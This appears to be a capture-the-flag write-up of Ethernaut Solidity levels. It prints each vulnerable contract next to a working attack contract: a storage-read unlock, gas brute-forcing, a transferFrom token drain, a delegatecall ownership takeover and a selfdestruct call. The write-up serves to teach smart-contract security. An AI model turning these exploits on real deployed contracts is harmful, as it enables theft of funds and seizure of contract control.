<h3 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h3><p>The following contract calls isLastFloor twice. We need to return false the first time and true the second time.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>attack contract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../src/Elevator.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack is Building &#123;</span><br><span class="line">    Elevator public target;</span><br><span class="line">    bool private toggle;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = Elevator(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint256) external override returns (bool) &#123;</span><br><span class="line">        toggle = !toggle;</span><br><span class="line">        return toggle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 floor) external &#123;</span><br><span class="line">        target.goTo(floor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here, we want to return false the first time and true the second time. There are many ways to do this.</p>
<ol>
<li>toggle &#x3D; !toggle</li>
<li>toggle ++; toggle &#x3D; toggle % 2;</li>
<li>toggle &#x3D; toggle &amp; true;</li>
<li>Directly store a set of false and true values in an array&#x2F;mapping.</li>
<li>Alternatively, set a counter to return false the first time and true thereafter.</li>
</ol>
<h3 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h3><p>Target Contract</p>
<p>The key is to understand <a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html?utm_source=chatgpt.com">Solidity’s slot storage rules</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925">https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925</a></p>
<p>This article also works.</p>
<p>Note that variables declared as constants and immutables are not stored in slots.</p>
<p>Then use getStorageAt to read the corresponding slot and then call await contract.unlock(‘0xdata’); in the console.</p>
<p>Then bytes16 retrieves the first 16 bytes.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GateKeeper1-and-2"><a href="#GateKeeper1-and-2" class="headerlink" title="GateKeeper1_and_2"></a>GateKeeper1_and_2</h3><p><strong>GateKeeper1</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        require(gasleft() % 8191 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here, gateOne requires an indirect call. tx.origin is our EOA address, and msg.sender is our attack contract address.</p>
<p>gateTwo is used to exhaustively enumerate the gas required to meet the requirements; gateThree is constructed based on the requirements. bytes8 &#x3D;&#x3D; uint64</p>
<p>uint16 is used to extract the first two bytes.</p>
<p>The attack contract is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IGatekeeperOne &#123;</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    IGatekeeperOne public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = IGatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Construct a key that matches gateThree:</span><br><span class="line">	  // The lower 32 bits == the lower 16 bits (i.e., 0x0000 + the lower 16 bits of origin), and the whole 64 bits != the lower 32 bits (the upper 32 bits are non-zero).</span><br><span class="line">    function buildKey() public view returns (bytes8 key) &#123;</span><br><span class="line">        uint16 low16 = uint16(uint160(tx.origin));     </span><br><span class="line">        uint64 low32 = uint64(low16);                  </span><br><span class="line">        uint64 hi32  = 1;                              </span><br><span class="line">        key = bytes8((uint64(hi32) &lt;&lt; 32) | low32);    // such as 0x00000001_0000ZZZZ</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Find gas such that gasleft()%8191==0</span><br><span class="line">    function exploit() external &#123;</span><br><span class="line">        bytes8 key = buildKey();</span><br><span class="line"></span><br><span class="line">        // Give a larger base and try it for 0..8191</span><br><span class="line">        for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class="line">            // 注意：这里用 .call 手工指定 gas</span><br><span class="line">            (bool ok, ) = address(target).call&#123;gas: 200000 + i&#125;(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, key)</span><br><span class="line">            );</span><br><span class="line">            if (ok) &#123;</span><br><span class="line">                // pass gateTwo + gateThree + gateOne</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>GateKeeper2</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">        &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The first one is the same here, so we’ll skip it.</p>
<p>gateTwo requires our attack contract code to have a size of 0. Here, we need to perform the attack in the contract’s constructor. Since the bytecode hasn’t been written to the chain yet, its size is 0.</p>
<p>gateThree is a simple XOR operation, so there’s nothing much to say.</p>
<p>The attack contract is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IGatekeeper &#123;</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack2 &#123;</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">// Called in the constructor, extcodesize(this) == 0 ⇒ Passes gateTwo</span><br><span class="line">// At this point, msg.sender is the contract address ⇒ Use address(this) to calculate the key</span><br><span class="line">        uint64 h = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));</span><br><span class="line">        bytes8 key = bytes8(~h); // 等价于 bytes8(type(uint64).max ^ h)</span><br><span class="line"></span><br><span class="line">        IGatekeeper(_target).enter(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Here, the second question only needs to be deployed, and no additional console or script calls are required.</p>
<h3 id="NaughtCoin"><a href="#NaughtCoin" class="headerlink" title="NaughtCoin"></a>NaughtCoin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This is primarily due to the fact that in ERC20, not only “Transfer” can transfer funds, but “TransferFrom” can also be used. Furthermore, the contract does not impose any restrictions on the “TransferFrom” function, allowing the timestamp check to be bypassed.</p>
<p>attack contract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool);</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract NaughtDrain &#123;</span><br><span class="line">    function drain(address token, address from, address to) external &#123;</span><br><span class="line">        uint256 amt = IERC20(token).balanceOf(from); // 如果没有balanceOf接口，就把额度写死传参</span><br><span class="line">        IERC20(token).transferFrom(from, to, amt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here we also lock TransferFrom to prevent</p>
<h3 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h3><p><a target="_blank" rel="noopener" href="https://rareskills.io/post/delegatecall">https://rareskills.io/post/delegatecall</a><br>One point worth mentioning here is the relationship between delegatecall and storage(slot). It modifies the data in slot 0 (according to the effect of the called function).</p>
<p>So, here, we can set the address of our attack contract to slot 0.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line">    // public library contracts</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line">    // Sets the function signature for delegatecall</span><br><span class="line">    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">        timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">        timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 1</span><br><span class="line">    function setFirstTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 2</span><br><span class="line">    function setSecondTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line">    // stores a timestamp</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击合约为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    address public timeZone1Library; // slot0，20 bytes</span><br><span class="line">    address public timeZone2Library; // slot1</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public&#123;</span><br><span class="line">    // Note that the signatures need to be consistent. Since we only need the first three slots (up to the owner), the rest are not important.</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写成这样可避免此类攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">library TimeLib &#123;</span><br><span class="line">    function normalize(uint256 t) internal pure returns (uint256) &#123;</span><br><span class="line">        // do some check</span><br><span class="line">        return t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PreservationSafeA &#123;</span><br><span class="line">    address public immutable owner;</span><br><span class="line">    uint256 public storedTime;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFirstTime(uint256 t) external &#123;</span><br><span class="line">        storedTime = TimeLib.normalize(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setSecondTime(uint256 t) external &#123;</span><br><span class="line">        storedTime = TimeLib.normalize(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line">    //generate tokens</span><br><span class="line">    function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">        new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        balances[_creator] = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // collect ether in return for tokens</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        balances[msg.sender] = msg.value * 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow transfers of tokens</span><br><span class="line">    function transfer(address _to, uint256 _amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">        balances[_to] = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean up after ourselves</span><br><span class="line">    function destroy(address payable _to) public &#123;</span><br><span class="line">        selfdestruct(_to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The etherscan tutorial, use the instance address to check the address to which the transfer was made. Convert it to a contract and call the destroy function.</p>
<p>Or manually calculate the simpleToken contract address.</p>
<p>First, the nonce of the first new contract initiated by an external account is 1.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const RECOVERY = &quot;&lt;你的 Recovery instance地址&gt;&quot;;</span><br><span class="line">await _ethers.utils.getContractAddress(&#123; from: RECOVERY, nonce: 1 &#125;);</span><br></pre></td></tr></table></figure>

